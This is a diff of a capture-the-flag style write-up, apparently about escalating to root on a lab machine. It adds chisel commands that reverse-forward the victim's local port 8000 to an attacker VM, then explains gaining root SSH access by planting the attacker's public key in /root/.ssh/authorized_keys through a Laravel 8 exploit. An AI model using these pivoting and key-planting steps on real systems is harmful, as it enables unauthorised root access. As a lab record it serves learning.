@@ -4,7 +4,7 @@ Found a port running locally on port 8000 via `linpeas.sh`.
 ![[Pasted image 20210911154613.png]]
 ## Forwarded this port to kali VM via chisel 
  Forwarded this port to kali VM via chisel to see what service was running on this port. 
- Used ``
+ Used `./chisel server -p 8001 -reverse -v` on kali VM and `./chisel client 10.10.14.98:8001 R:127.0.0.1:8000:127.0.0.1:8000` on victim machine.
  ## Found that PHP Laravel version 8 was running on this port
  It turned out that PHP laravel version 8 was running on this port.
 ![[Pasted image 20210911155004.png]]
@@ -44,6 +44,7 @@ Our payload/command consisted of copying Kali VM public key to authorized_keys i
 Ran exploit on Kali VM as port was forwarded on kali VM and command/payload will execute on victim machine. Execution of payload on victim machine was succeeded.
 ![[Pasted image 20210911162631.png]]
 ### Ssh logged in as root 
+As Kali VM public was copied in /root/.ssh/authorized_keys file, so we can ssh login as root on victim machine.
 ![[Pasted image 20210911162934.png]]
 
 
